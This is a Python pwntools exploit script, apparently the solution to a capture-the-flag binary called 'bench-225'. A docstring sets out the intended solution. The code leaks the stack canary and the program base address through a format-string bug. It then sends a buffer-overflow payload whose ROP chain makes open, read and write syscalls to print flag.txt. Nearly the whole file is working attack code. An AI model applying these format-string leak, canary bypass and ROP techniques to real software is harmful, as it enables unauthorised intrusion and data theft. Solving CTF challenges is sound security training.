'''
Intended Solution:
- Bench-press 225 until the stamina is lower than 50. This will unlock the motivational quotes option.
- Leak the canary, elf address with the motivational quotes.
- Do a motivational quote.
    - Buffer overflow + Canary + RBP overflow + ROP Chain to Open, Read, Write flag.txt
'''

from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

if args.GDB:
    p = gdb.debug('./bench-225', '''
        b *motivation+814
        c
    ''')
else:
    p = process('./bench-225')
e = ELF('./bench-225')

def quote_leak(fmt):
    p.sendline('6')
    p.sendline(fmt)
    print(p.recvuntil('Quote: \"'))
    return p.recvuntil('"').strip()[:-1]

# Get Weight to 225
for x in range(5):
    p.sendline('3')

# Bench for 8 reps
for x in range(8):
    p.sendline('4')

# Leak the canary and base address
canary = int(quote_leak("%9$p"), 16)
e.address = int(quote_leak("%11$p"), 16) - 707 - e.sym['main']

print(f'Canary: {hex(canary)}')
print(f'Base: {hex(e.address)}')

rbp_write_clear_eax_pop_rax = 0x000000000000132c # mov qword ptr [rbp - 8], rax ; xor eax, eax ; pop ax ; ret
pop_rax = 0x0000000000001332 # pop rax ; ret
pop_rbp = 0x0000000000001293 # pop rbp ; ret
pop_rbx = 0x0000000000001334 # pop rbx ; ret
pop_rcx = 0x000000000000133c # pop rcx ; ret
pop_rdi = 0x0000000000001336 # pop rdi ; ret
pop_rdx = 0x0000000000001338 # pop rdx ; ret
pop_rsi = 0x000000000000133a # pop rsi ; ret
syscall = 0x000000000000133e # syscall ; ret
mov_rdi_rax = 0x0000000000001341 # mov rax, rdi; ret

# ROP Chain Payload

# Overflow
payload = b''
payload += b'A' * 8
payload += p64(canary)
payload += b'B' * 8

# Write flag.txt\x00

# Null Terminator (\x00)
payload += p64(e.address + pop_rax)
payload += p64(0x7478742E67616C66)

## Data Section Address
payload += p64(e.address + pop_rbp)
payload += p64(e.address + e.get_section_by_name('.data').header['sh_addr'] + 0x8)

## Write
payload += p64(e.address + rbp_write_clear_eax_pop_rax)
payload += p64(0x0)

# ## Data Section Address
payload += p64(e.address + pop_rbp)
payload += p64(e.address + e.get_section_by_name('.data').header['sh_addr'] + 0x8 + 0x8)

## Write
payload += p64(e.address + rbp_write_clear_eax_pop_rax)
payload += p64(0x0)


# Call Open
payload += p64(e.address + pop_rdi)
payload += p64(e.address + e.get_section_by_name('.data').header['sh_addr'])

payload += p64(e.address + pop_rsi)
payload += p64(0x0)

payload += p64(e.address + pop_rax)
payload += p64(0x2)

payload += p64(e.address + syscall)

# Call Read 
payload += p64(e.address + mov_rdi_rax)

payload += p64(e.address + pop_rsi)
payload += p64(e.address + e.get_section_by_name('.data').header['sh_addr'] + 0x10)

payload += p64(e.address + pop_rdx)
payload += p64(0x100)

payload += p64(e.address + pop_rax)
payload += p64(0x0)

payload += p64(e.address + syscall)

# Call Write
payload += p64(e.address + pop_rdi)
payload += p64(0x1)

payload += p64(e.address + pop_rax)
payload += p64(0x1)

payload += p64(e.address + syscall)

p.sendline('6')
p.sendline(payload)

p.interactive()